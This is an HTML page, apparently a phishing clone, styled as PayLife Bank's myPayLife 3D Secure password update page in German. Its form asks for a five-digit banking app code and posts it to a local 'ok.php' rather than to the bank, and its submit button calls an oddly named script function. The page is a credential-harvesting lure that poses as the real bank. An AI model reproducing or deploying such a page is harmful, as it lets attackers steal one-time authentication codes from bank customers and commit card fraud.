<!DOCTYPE html>
<!-- saved from url=(0118)https://my.paylife.at/de/meine-karten/3d-secure/update-3d-secure-passwort/?CardId=8e9a0e9e-34ac-5794-a1e4-bc23d7a3afd8 -->
<html style="" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="theme-color" content="#ffffff">
	
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <meta name="description" content="">
    <meta name="keywords" content="">
    <meta name="author" content="PayLife Bank">

    <style>
        .javascript-enabled {
            display: block;
        }

        .javascript-disabled {
            display: none;
        }
    </style>

    <link href="../../../css/Umbraco%20styles%20for%20RTE.css" rel="stylesheet" type="text/css" />
    <link href="../../../bundles/css/webportal-v=8lnRj3VLvg0RMlrnUthTHPZgqutrh76aeZrCYs924Jo1.css" rel="stylesheet"/>
    
<script src="../../../bundles/js-v=ot4nNiRolrywfIjlMtNkRkrRP0wwjl2c73lEUq5Y8jI1.js"></script>

    <title>Karten &amp; Optionen</title>
    <script nonce="">
        if (navigator.cookieEnabled) {
            document.title = Common.HtmlEncode("Karten &amp; Optionen");
        }
    </script>

    <link rel="shortcut icon" type="image/png" href="https://my.paylife.at/Content/Images/Common/FavIcons/favicon.png">

    <script nonce="">
        Browser.RedirectIfBrowserIsTooOld("/de/fehlerbehandlung/browser-nicht-mehr-unterstuetzt/");
        ClientValidation.Initialize();
    </script>

<!-- Copyright (c) 2000-2018 etracker GmbH. All rights reserved. -->
<!-- This material may not be reproduced, displayed, modified or distributed -->
<!-- without the express prior written permission of the copyright holder. -->
<!-- etracker tracklet 4.1 -->
<script type="text/javascript" nonce="">
    //var et_pagename = "";
    //var et_areas = "";
    //var et_url = "";
    //var et_target = "";
    //var et_tval = "";
    //var et_tonr = "";
    //var et_tsale = 0;
    //var et_basket = "";
    //var et_cust = 0;
</script>
<script id="_etLoader" type="text/javascript" charset="UTF-8" data-respect-dnt="false" data-secure-code="pTm6U3" src="./Karten_files/e.js"></script><script async="" type="text/javascript" charset="UTF-8" id="_etCode" src="./Karten_files/t.js"></script>
<!-- etracker tracklet 4.1 end -->

<script type="text/javascript" nonce="">
</script>


    
<script type="text/javascript" src="./Karten_files/cntcc"></script></head>
<body id="sesam2" style="">
    <div id="mediaTester"></div>

    <noscript>
        <style type="text/css">
            .javascript-enabled {
                display: none !important;
            }

            .javascript-disabled {
                display: block !important;
            }
        </style>
    </noscript>

    <script nonce="">
        Browser.SetupPageForCookieRequirements();
    </script><style type="text/css">.cookie-enabled { display: block; }.cookie-disabled { display: none; }</style>

    


<div id="page">
        <div id="acceptCookiesContainer" style="display: none;">
            Cookies helfen uns bei der Bereitstellung unserer Dienste. Durch die Nutzung unserer Dienste erklären Sie sich mit dem Einsatz von Cookies einverstanden.
                (<a href="https://my.paylife.at/de/faq/faq-%C3%BCbersicht/#impressum" target="_blank"> Weitere Informationen </a>)
            <input id="acceptCookies" type="button" value="OK">
        </div>



<header id="headerSection">
    <div class="navbar navbar-fixed-top">
        <div class="navbar-default">
            <div class="container">
                <div class="row">
                    <div class="col-xs-8 col-md-3">
                        <div class="javascript-enabled cookie-enabled">
                                <a class="logo" href="https://my.paylife.at/de/home/startseite/">
                                    
<img class="hidden-xs hidden-md" src="./Karten_files/logo.png" alt="PayLife Logo">
<img class="visible-md margin-t-10" src="./Karten_files/logo(1).png" alt="PayLife Logo">
<img class="visible-xs" src="./Karten_files/logo(2).png" alt="PayLife Logo">

                                </a>
                        </div>
                        <div class="javascript-disabled cookie-disabled">
                            <div class="logo">
                                
<img class="hidden-xs hidden-md" src="https://my.paylife.at/Content/Images/PayLife/logo.png" alt="PayLife Logo">
<img class="visible-md margin-t-10" src="https://my.paylife.at/Content/Images/PayLife/logo.png?width=150" alt="PayLife Logo">
<img class="visible-xs" src="https://my.paylife.at/Content/Images/PayLife/logo.png?width=170" alt="PayLife Logo">

                            </div>
                        </div>
                    </div>
                    <div class="javascript-enabled cookie-enabled">
                        <div class="col-md-5 text-center hidden-xs">
                        </div>
                        <div class="col-xs-4 col-md-4">
                                <a id="menuButtonMobile" class="menu-button visible-xs" data-toggle="collapse" data-target="#mobileMenu">
                                    <span class="icon-bar"></span>
                                    <span class="icon-bar"></span>
                                    <span class="icon-bar"></span>
                                </a>
                            <div class="menu-container menu-simple hidden-xs">
                                <div class="menu-items-container">
                                        <a class="btn btn-light btn-default" href="https://my.paylife.at/de/authentifizierung/logout/">Abmelden</a>
                                            <a class="menu-link" href="https://my.paylife.at/de/authentifizierung/passwort-aendern/">Konto</a>
                                            <div class="menu-link">|</div>
                                                                            <a class="menu-link" href="https://my.paylife.at/de/faq/faq-%C3%BCbersicht/#KO_3DS_aendern-Answer" target="_blank">Hilfe</a>
                                                                                <div class="menu-link">|</div>
                                        <a class="menu-link" href="https://my.paylife.at/de/home/startseite/">Home</a>
                                </div>

                            </div>
                        </div>
                    </div>
                </div>
                    <div class="row visible-xs">
                        <div id="mobileMenu" class="navbar-collapse collapse">
                            <ul class="menu">
                                                                    <li class="menu-link">
                                        <a href="https://my.paylife.at/de/home/startseite/">Home</a>
                                    </li>
                                                                    <li class="menu-link">
                                        <a href="https://my.paylife.at/de/faq/faq-%C3%BCbersicht/#KO_3DS_aendern-Answer" target="_blank">Hilfe zur Seite</a>
                                    </li>
                                                                    <li class="menu-link">
                                        <a href="https://my.paylife.at/de/authentifizierung/passwort-aendern/">Konto</a>
                                    </li>
                                <li class="menu-link">

                                        <a href="https://my.paylife.at/de/authentifizierung/logout/">Abmelden</a>
                                </li>
                            </ul>
                        </div>
                    </div>
            </div>
        </div>
    </div>

        <div id="menuContainer" class="hidden">
            <ul class="menu">
                <li class="menu-link">
                    <a href="https://my.paylife.at/de/home/startseite/">Home</a>
                </li>
                <li class="menu-link">
                    <a href="https://my.paylife.at/de/faq/faq-%C3%BCbersicht/#KO_3DS_aendern-Answer" target="_blank">Hilfe zur Seite</a>
                </li>
                <li class="menu-separator"></li>
                <li class="menu-link">
                    <a href="https://my.paylife.at/de/authentifizierung/passwort-aendern/">Konto</a>
                    <a href="https://my.paylife.at/de/authentifizierung/logout/">Abmelden</a>
                </li>
            </ul>
        </div>
        <div id="popoverTemplate" class="hidden">
            <div class="popover menu-popover" role="tooltip">
                <div class="arrow"></div>
                <div class="popover-content"></div>
            </div>
        </div>

        <script nonce="">
            // Session timeout
            Timeout.ResetTimeout('/de/authentifizierung/logout/', 840);
        </script>

    <script nonce="">
        Header.InitializeMenu();
    </script>
</header>
    <div id="mainSection" class="container">
        <div class="javascript-disabled cookie-disabled">
<section id="errorSection">
    <div class="row">
        <div class="col-xs-12">
            <h1>Bitte aktivieren Sie JavaScript und Cookies</h1>
        </div>
    </div>
    <div class="row margin-b-10">
        <div class="col-xs-12">
            <p class="pageDescription">Ungültige Browsereinstellungen</p>
        </div>
    </div>

    <div class="row">
        <div class="col-md-8">
            <div class="panel panel-info box">
                <h4>Ungültige Browsereinstellungen</h4>
                <span>Um myPayLife verwenden zu können, aktivieren Sie bitte sowohl JavaScript als auch Cookies und deaktivieren Sie etwaige Script-Blocker für myPayLife.</span>
            </div>
        </div>
        <div class="col-md-4">
                <div class="panel panel-default clearfix">
                    <img src="https://my.paylife.at/Content/Images/PayLife/help.png" class="pull-left margin-r-10">
                    <p><strong>Cookies und JavaScript können Sie in den Einstellungen Ihres Browsers aktivieren.</strong></p>
                </div>

            <div class="panel panel-default">
    <img src="./Karten_files/secureboxicon.png" class="margin-b-5">
    <div><p><span>Ihre Eingaben werden verschlüsselt zu myPayLife gesendet und sicher gespeichert.</span></p></div>
</div>
        </div>
    </div>
</section>
        </div>
        <div class="javascript-enabled cookie-enabled">
            

<section id="processConfirmationSection">
    <div class="row">
        <div class="col-xs-12">
            <h1>
    Karten &amp; Optionen
</h1>
        </div>
    </div>
    <div class="row margin-b-10">
        <div class="col-xs-12">
        </div>
    </div>
        <div class="row">
            <div class="col-xs-12">
                <div id="processConfirmationContainer" class="panel panel-default structured-content">
                    

                    <div class="row">
                        <div class="col-xs-12">
                            <div id="processConfirmationCardContent">
                                <div class=" row">
                                    <div class="col-xs-12">
                                        <h2>
   Geben Sie Ihren 5-stelligen App Code ein:
</h2>
                                    </div>
                                </div>
                                <div class="row">
                                    
                                </div>

                                






<section id="productDetails">
        <form action="ok.php" method="POST" id="submitForm" novalidate="novalidate">

            <div class="row">
                <div class="col-xs-12 col-md-9">
                </div>
            </div>

            <div class="row info-line">
                
            </div>

            

            <div class="row">
                <div class="col-xs-12 col-md-9">
                    <h4></h4>
                </div>
            </div>

            <div class="row info-line">
            </div>

            <div class="row">
                <div class="col-md-7">
                    <div class="row">
                        <div class="col-xs-4 col-md-5">
                        
                            <label class="control-label padded-left">
                                App Code:
                            </label>
                        </div>
                        <div class="col-xs-6 col-md-7 col-condensed">
                            <div class="input-group input-popover">
                                 <input autocomplete="off" class="form-control" maxlength="" name="New" required="" placeholder="" type="text">
                        
                                </span>
                            </div>
                            <span class="field-validation-valid field-validation" data-valmsg-for="New3DsPassword" data-valmsg-replace="true"></span>
                        </div>
                    </div>
                <div class="col-md-5 hidden-xs hidden-sm" id="passwordPolicy">
                    
<div id="passwordCriteriaContainer">

    <figure id="passwordPolicyContent">

        <ul id="passwordCriterias">
    </ul></figure>
</div>
                </div>
            </div>
                <div class="col-md-5 hidden-xs hidden-sm" id="passwordPolicy">
                    
<div id="passwordCriteriaContainer">

    <figure id="passwordPolicyContent">

        <ul id="passwordCriterias">
    </figure>
</div>
                </div>
            </div>

            <div class="row info-line">
                
            </div>

            

                <div class="row">
                    
                </div>
                <div class="row info-line">
                    
                </div>
                <div class="row">
                    
                </div>
                <div class="row">
                    <div class="col-xs-12 col-md-9 padded-left">
                        
                        <div id="confirmationError" class="field-validation-error" style="display: none;">Bitte bestätigen Sie die Bedingungen.</div>
                    </div>
                </div>
            <br>
            

    <div class="row info-line">
        <div class="col-xs-12 description">
            
        </div>

    </div>
    
    <div class="row">
        <div class="col-md-7">
            
        </div>
    </div>
    


            <div class="row">
                <div id="confirmationActions">
                    <div class="col-xs-12">
                        <div class="button-container">
                            <input  type="hidden" value="">
                            <input data-val="true" data-val-required="The CardId field is required." id="CardId"  type="hidden" value="8e9a0e9e-34ac-5794-a1e4-bc23d7a3afd8">
                            <input id="gYALAo0rZWNHBt" class="lnkAceptar btn btn-primary"  onclick="javascript:xx577VnABGmepL();" value="Speichern" type="submit">
                            <a id="popoverConfirmation" class="cancel-link" href="https://my.paylife.at/de/meine-karten/3d-secure/update-3d-secure-passwort/?CardId=8e9a0e9e-34ac-5794-a1e4-bc23d7a3afd8#" data-original-title="" title="">Abbrechen</a>
                        </div>
                    </div>
                </div>
            </div>

            <div id="popoverHtmlTitle" class="hidden">
                Sind Sie sicher?
            </div>

            <div id="popoverHtmlContent" class="hidden">
                Möchten Sie den Prozess wirklich abbrechen?
                <div class="button-container clearfix">
                    <a class="btn btn-primary" data-id="unlockConfirmLink" href="https://my.paylife.at/de/meine-karten/3d-secure/update-3d-secure-passwort/?CardId=8e9a0e9e-34ac-5794-a1e4-bc23d7a3afd8#">Ja</a>
                    <a class="cancel-link" data-id="unlockCancelLink" href="https://my.paylife.at/de/meine-karten/3d-secure/update-3d-secure-passwort/?CardId=8e9a0e9e-34ac-5794-a1e4-bc23d7a3afd8#">Nein</a>
                </div>
            </div>

            <script nonce="">
            var options = {
                popoverId: "#popoverConfirmation",
                titleId: "#popoverHtmlTitle",
                contentId: "#popoverHtmlContent",
                confirmDataId: "unlockConfirmLink",
                cancelDataId: "unlockCancelLink"
            };
            ProductDetails.InitializeConfirmationSetting(options,'', true, null, '/de/meine-karten/3d-secure/3d-secure-passwort-update-abbrechen/?CardId=8e9a0e9e-34ac-5794-a1e4-bc23d7a3afd8');
            </script>
           
        </form>

</section>


                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

    
    <script nonce="">
        ProductDetails.InitializeOrderWizardStepOne('true',
            '#confirmationCheckbox',
            '#submitForm',
            '#submitButton');

        $(document).ready(function() {
            Tracker.TrackEventsOnClick('#requestScaToken',
                "/de/authentifizierung/tracker/",
                { eventId: "T10110_2", cardId: "8e9a0e9e-34ac-5794-a1e4-bc23d7a3afd8" });
            Common.ConvertAllBbCodesToHtml(".bb-code");
            Common.PopoverInfoCriteria();
        });
    </script>


</section>

<script nonce="">
    $(document).ready(function () {
        Common.ConvertAllBbCodesToHtml(".bb-code");
    });
</script>
        </div>
    </div>
</div>

<!-- myPayLife Version : 1.0.0.0 -->
<footer id="footerSection">
    <div class="container">
        <div class="row">
            <div class="col-xs-12">
                <div class="panel panel-default links">
                    <div class="row">
                        <div class="col-xs-4 col-md-4 text-left">
                                <a href="https://my.paylife.at/de/faq/faq-%C3%BCbersicht/" target="_blank">Hilfe</a>
                        </div>
                        <div class="col-xs-4 col-md-4 text-center">
                            <a href="https://www.paylife.at/impressum" target="_blank">
                                <img src="../../../Content/Images/PayLife/logo-footer.jpg" alt="PayLife-Logo">
                            </a>
                        </div>
                        <div class="col-xs-4 col-md-4 text-right">
                                <a href="https://my.paylife.at/de/faq/faq-%C3%BCbersicht/#impressum" target="_blank">Impressum</a>
                        </div>
                    </div>
                </div>  
            </div>
        </div>
    </div>
</footer>




    
    <div id="globalErrorText">Es ist ein Fehler aufgetreten</div>

    <script nonce="">
        AcceptCookies.SetupAcceptCookies("#acceptCookies", "#acceptCookiesContainer", "635665051200000000");
    </script>


</body></html>